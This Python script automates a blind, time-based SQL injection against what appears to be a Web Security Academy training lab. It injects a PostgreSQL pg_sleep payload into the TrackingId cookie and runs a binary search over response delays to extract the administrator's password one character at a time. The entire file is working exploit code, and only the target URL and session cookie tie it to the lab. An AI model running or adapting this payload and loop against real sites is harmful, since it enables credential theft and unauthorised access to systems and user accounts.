import requests
import time
import math

url = "https://0a7f00fa03eade1d811e35af000f00ad.web-security-academy.net/"


def generate_cookie(operator: str, char: str, index: int):
    payload = f"g9uvHMlk0igPWx6U' || (SELECT CASE WHEN (SUBSTRING(password,{str(index)},1) {operator} '{char}') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator') --"
    cookie = {
        "session": "r6bP63PlKjYXfrMTovyqT4uqauDmoBrN",
        "TrackingId": payload
    }
    return cookie


def bigger_attempt(index: int, char: str):
    before_time = time.time()
    cookie = generate_cookie(operator=">=", char=char, index=index)
    requests.get(url=url, cookies=cookie)
    after_time = time.time()
    print("[b]", after_time - before_time, "::", char)
    if after_time - before_time > 2:
        return True
    else:
        return False


def equel_attempt(index: int, char: str):
    before_time = time.time()
    requests.get(url=url, cookies=generate_cookie(
        operator="=", char=char, index=index))
    after_time = time.time()
    print("[e]", after_time - before_time, "::", char)
    if after_time - before_time > 2:
        return True
    else:
        return False


def main_loop(index: int):
    LIST = [33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81,
            82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125,]

    start = 0
    end = len(LIST)
    prev = 0

    while True:
        current = math.floor((start + end) / 2)
        bigger_result = bigger_attempt(index=index, char=chr(LIST[current]))
        if current == prev:
            equel_result = equel_attempt(index=index, char=chr(LIST[current]))
            if equel_result:
                return True, chr(LIST[current])
            else:
                break
        if bigger_result:
            start = current - 1
        else:
            end = current + 1
        prev = current

    start = 0
    end = len(LIST)
    prev = 0

    while True:
        current = math.ceil((start + end) / 2)
        bigger_result = bigger_attempt(char=chr(LIST[current]), index=index)
        if current == prev:
            equel_result = equel_attempt(char=chr(LIST[current]), index=index)
            if equel_result:
                return True, chr(LIST[current])
            else:
                return False, None
        if bigger_result:
            start = current - 1
        else:
            end = current + 1
        prev = current


password = ""
index = 1
while True:
    result = main_loop(index)
    if result[0]:
        password += result[1]
        print("now::", password)
        index += 1
        continue
    else:
        break
print("password is : ", password)
